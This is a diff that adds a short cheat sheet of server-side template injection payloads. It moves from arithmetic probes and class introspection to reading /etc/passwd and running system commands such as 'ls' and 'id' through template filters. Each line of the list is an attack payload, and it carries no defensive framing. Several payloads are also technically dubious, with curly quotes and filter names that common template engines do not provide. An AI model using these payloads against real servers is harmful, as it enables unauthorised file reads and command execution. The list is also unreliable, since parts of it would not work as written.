@@ -1,0 +1,17 @@
+SSTI PAYLOADS <3
+
+First: Basic math calculations
+* `{{4*4}}`
+* `{{7+3}}`
+
+Second: Try to retrieve application classes or objects:
+* `{{ ”.__class__ }}`
+* `{{ ”.__class__.__mro__ }}`
+
+Third: Read files from the web server 
+* `{{ ‘/etc/passwd’ | read }}`
+* `{{ ‘file:///etc/passwd’ | urlize }}`
+
+Final: Execute system commands
+* `{{ ‘ls’ | shell_exec }}`
+* `{{ ‘id’ | system }}`
